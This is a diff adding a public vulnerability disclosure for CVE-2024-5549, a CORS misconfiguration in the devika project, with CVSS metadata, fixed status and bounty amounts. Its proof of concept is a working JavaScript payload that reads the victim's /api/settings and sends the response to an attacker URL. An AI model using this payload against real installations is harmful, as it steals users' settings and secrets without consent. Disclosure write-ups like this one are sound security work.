@@ -1,0 +1,48 @@
+Title: Data leak through CORS misconfiguration in stitionai/devika
+
+Proof of Concept: 
+1- Create the following file in the attacker server:
+
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','http://127.0.0.1:1337/api/settings',true); // victim data
+
+    req.send();
+    function reqListener() {
+        console.log(this.responseText);
+        location='http://127.0.0.1:8888/?k='+encodeURIComponent(this.responseText); --> attacker URL
+    };
+ </script>
+
+2- Make the user open the following URL: http://[attackerURL]/index.html
+
+3- When the user opens this, the code runs and the information is obtained by the attacker.
+
+User opened the malicious URL.
+
+Data stolen by the attacker.
+
+4- Other actions such as creating/deleting a project, sending messages, editing settings can be done.
+
+Impact: 
+Information integrity - confidentiality.
+
+CVE ID: CVE-2024-5549
+Status: (published)
+Vulnerability Type: CWE-346: Origin Validation Error
+Severity: High (8.1)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: Required
+Scope: Unchanged
+Confidentiality: High
+Integrity: High
+Availability: None
+Registry: Pypi
+Affected Version: n/a
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $450
+Fix Bounty: $112.5
